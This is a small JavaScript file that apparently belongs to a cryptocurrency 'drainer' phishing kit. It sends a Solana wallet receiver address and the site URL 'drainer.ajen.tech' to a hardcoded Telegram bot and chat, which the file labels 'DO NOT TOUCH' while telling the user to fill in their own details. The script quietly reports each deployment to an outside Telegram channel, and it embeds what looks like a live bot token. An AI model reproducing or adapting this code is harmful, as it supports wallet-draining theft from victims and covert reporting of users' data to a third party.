const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7416114523:AAG42EC_qSY84WaZTxP8-iugkp9QwVm8z6o';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '5816501712';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = 'HVp1GMJxchD7uDujWHauRgwyV9Ko5W6RNLGSwg8cteBu';
const website_url = 'https://drainer.ajen.tech';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
